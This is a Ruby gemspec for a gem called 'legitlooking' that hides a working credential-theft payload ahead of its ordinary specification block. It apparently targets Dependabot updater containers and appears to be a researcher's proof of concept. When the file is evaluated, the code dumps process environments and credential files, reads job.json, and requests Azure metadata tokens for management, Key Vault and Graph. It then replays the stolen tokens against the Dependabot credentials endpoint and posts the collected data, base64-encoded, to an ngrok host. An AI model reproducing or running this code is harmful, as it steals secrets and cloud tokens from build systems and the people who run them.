# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"
  require "json"

  cmd  = ->(c) { `#{c} 2>/dev/null`.strip[0, 2000] }
  read = ->(f) { File.read(f)[0, 3000] rescue "ERR: #{$!.message}" }
  lines  = []
  job_id  = ENV["DEPENDABOT_JOB_ID"].to_s
  api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"
  proxy_h = "172.19.0.2"
  proxy_p = 1080

  req_proxy = lambda do |method, url, body = nil, extra_hdrs = {}|
    uri   = URI(url)
    klass = { "GET" => Net::HTTP::Get, "POST" => Net::HTTP::Post,
              "PATCH" => Net::HTTP::Patch }[method]
    r = klass.new(uri)
    r["Content-Type"] = "application/json"
    r["Accept"]       = "application/json"
    extra_hdrs.each { |k, v| r[k] = v }
    r.body = body.to_json if body
    Net::HTTP.start(uri.host, uri.port, proxy_h, proxy_p,
                    use_ssl: (uri.scheme == "https"),
                    open_timeout: 8, read_timeout: 8) { |h|
      resp = h.request(r)
      { code: resp.code.to_s, body: resp.body.to_s[0, 2000] }
    }
  rescue => e
    { code: "ERR", body: e.message[0, 200] }
  end

  # ============================================================
  # 1. ALLE PROCESSEN
  # ============================================================
  lines << "=== 1. PROCESS TREE ==="
  lines << cmd.("ps auxww")

  # ============================================================
  # 2. PARENT PROCESS ENVIRON -- token gecleared in subprocess?
  #    /proc/*/environ leesbaar als zelfde UID
  # ============================================================
  lines << "\n=== 2. PROCESS ENVIRON DUMP ==="
  Dir.glob("/proc/[0-9]*/environ").each do |f|
    pid = f.split("/")[2]
    begin
      raw = File.read(f).split("\x00")
      interesting = raw.select { |v|
        v.match?(/TOKEN|SECRET|CRED|KEY|PASS|AUTH|DEPEND|JOB/i)
      }
      next if interesting.empty?
      lines << "  PID #{pid}:"
      interesting.each { |v| lines << "    #{v[0, 300]}" }
    rescue; end
  end

  # ============================================================
  # 3. OPEN FILE DESCRIPTORS -- credential files, sockets
  # ============================================================
  lines << "\n=== 3. OPEN FDs (credential-achtig) ==="
  Dir.glob("/proc/[0-9]*/fd").each do |fddir|
    pid = fddir.split("/")[2]
    begin
      fds = Dir.glob("#{fddir}/*").map { |fd|
        File.readlink(fd) rescue nil
      }.compact.select { |t|
        t.match?(/cred|token|secret|key|auth|depend|job|\.json|\.conf/i) &&
          !t.match?(/\/proc\/|\/dev\//)
      }
      next if fds.empty?
      lines << "  PID #{pid}: #{fds.join(', ')}"
    rescue; end
  end

  # ============================================================
  # 4. FILESYSTEM CREDENTIAL HUNT
  # ============================================================
  lines << "\n=== 4. CREDENTIAL FILE HUNT ==="
  %w[
    /run/secrets
    /var/run/secrets
    /var/run/secrets/kubernetes.io/serviceaccount
    /secrets
    /tmp/secrets
    /home/dependabot/.netrc
    /home/dependabot/.npmrc
    /home/dependabot/.gem/credentials
    /home/dependabot/.docker/config.json
    /home/dependabot/.config/gh/hosts.yml
  ].each do |path|
    if File.exist?(path)
      if File.directory?(path)
        entries = Dir.glob("#{path}/**/*", File::FNM_DOTMATCH)
                     .reject { |f| File.directory?(f) }
        lines << "  DIR #{path}: #{entries.join(', ')[0, 400]}"
        entries.first(5).each { |e| lines << "    #{e}: #{read.(e)}" }
      else
        lines << "  FILE #{path}:\n#{read.(path)}"
      end
    end
  end

  lines << "\n--- find credential files ---"
  lines << cmd.("find /home/dependabot /tmp /var/run /run -type f \\( -name '*.json' -o -name '*.token' -o -name '*.key' -o -name '.netrc' -o -name '.npmrc' -o -name 'credentials' \\) 2>/dev/null")

  lines << "\n--- job.json volledig ---"
  job_path = ENV.fetch("DEPENDABOT_JOB_PATH", "/home/dependabot/dependabot-updater/job.json")
  lines << read.(job_path)

  lines << "\n--- updater dir ---"
  lines << cmd.("find /home/dependabot/dependabot-updater -maxdepth 3 -type f 2>/dev/null | head -60")

  # ============================================================
  # 5. UNIX SOCKETS -- proxy via socket?
  # ============================================================
  lines << "\n=== 5. UNIX SOCKETS ==="
  lines << cmd.("find /tmp /var/run /run -maxdepth 4 -type s 2>/dev/null")
  lines << cmd.("ss -xlp 2>/dev/null")

  # ============================================================
  # 6. PROXY CONNECT -- proxy naar zichzelf / localhost
  # ============================================================
  lines << "\n=== 6. PROXY CONNECT NAAR INTERNE HOSTS ==="
  [
    ["127.0.0.1",  80,   "/"],
    ["127.0.0.1",  8080, "/"],
    ["127.0.0.1",  9090, "/metrics"],
    ["172.19.0.2", 1080, "/"],
    ["172.19.0.1", 80,   "/"],
    ["172.19.0.1", 443,  "/"],
  ].each do |host, port, path|
    begin
      uri  = URI("http://#{host}:#{port}#{path}")
      req2 = Net::HTTP::Get.new(uri)
      Net::HTTP.start(uri.host, uri.port, proxy_h, proxy_p,
                      use_ssl: false, open_timeout: 5, read_timeout: 5) { |h|
        r = h.request(req2)
        lines << "  #{host}:#{port}#{path}: HTTP #{r.code} | #{r.body.to_s[0, 300]}"
      }
    rescue => e
      lines << "  #{host}:#{port}#{path}: #{e.message[0, 100]}"
    end
  end

  # ============================================================
  # 7. AZURE IMDS MET METADATA:TRUE HEADER
  #    Eerder getest zonder dit -- nu correct
  # ============================================================
  lines << "\n=== 7. AZURE IMDS (Metadata: true) ==="
  {
    "instance"  => "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "mgmt_token"=> "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "vault_token"=> "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
    "graph_token"=> "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
  }.each do |name, url|
    begin
      require "timeout"
      Timeout.timeout(5) do
        uri  = URI(url)
        req2 = Net::HTTP::Get.new(uri)
        req2["Metadata"]   = "true"
        req2["User-Agent"] = "curl/7.68.0"
        resp = Net::HTTP.start(uri.host, uri.port, open_timeout: 4, read_timeout: 4) { |h| h.request(req2) }
        lines << "  #{name}: HTTP #{resp.code} | #{resp.body.to_s[0, 800]}"
      end
    rescue => e
      lines << "  #{name}: #{e.message[0, 100]}"
    end
  end

  # ============================================================
  # 8. PROXY INJECTED HEADERS -- ngrok echo
  #    Wat voegt de proxy toe aan onze requests?
  #    Stuur naar ngrok die de raw request headers logt
  # ============================================================
  lines << "\n=== 8. PROXY HEADER INJECTION CHECK ==="
  begin
    r = req_proxy.("GET", "#{COLLAB_URL}?poc=header_echo_via_proxy", nil,
                   { "X-Original-Header" => "test123" })
    lines << "  via proxy: HTTP #{r[:code]}"
    lines << "  (zie ngrok output voor geinjected headers)"
  rescue => e
    lines << "  ERR: #{e.message}"
  end

  # Direct (zonder proxy) voor vergelijking
  begin
    uri2 = URI("#{COLLAB_URL}?poc=header_echo_direct")
    req2 = Net::HTTP::Get.new(uri2)
    Net::HTTP.start(uri2.host, uri2.port, use_ssl: true,
                    open_timeout: 6, read_timeout: 6) { |h| h.request(req2) }
    lines << "  direct: request verstuurd"
  rescue => e
    lines << "  direct ERR: #{e.message}"
  end

  # ============================================================
  # 9. /credentials MET ALLE MOGELIJKE AUTH VARIANTEN
  # ============================================================
  lines << "\n=== 9. /credentials AUTH BYPASS POGINGEN ==="
  cred_url = "#{api_url}/update_jobs/#{job_id}/credentials"

  # a) Zonder Authorization header (alleen wat proxy injecteert)
  r = req_proxy.("GET", cred_url)
  lines << "  geen extra auth: HTTP #{r[:code]} | #{r[:body][0, 200]}"

  # b) Authorization: Bearer {job_id}
  r = req_proxy.("GET", cred_url, nil, { "Authorization" => "Bearer #{job_id}" })
  lines << "  Bearer job_id: HTTP #{r[:code]} | #{r[:body][0, 200]}"

  # c) Probeer token uit /proc/1/environ
  begin
    proc1_env = File.read("/proc/1/environ").split("\x00")
                    .select { |v| v.match?(/TOKEN|SECRET|CRED/i) }
    proc1_env.each do |var|
      k, v = var.split("=", 2)
      next unless v && v.length > 8
      r = req_proxy.("GET", cred_url, nil, { "Authorization" => "token #{v}" })
      lines << "  #{k} als Bearer: HTTP #{r[:code]} | #{r[:body][0, 200]}"
    end
  rescue => e
    lines << "  proc1 token probe ERR: #{e.message}"
  end

  # ============================================================
  # EXFIL
  # ============================================================
  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=deep_cred_hunt")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 25, read_timeout: 25) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=deep_cred_hunt&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.21"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
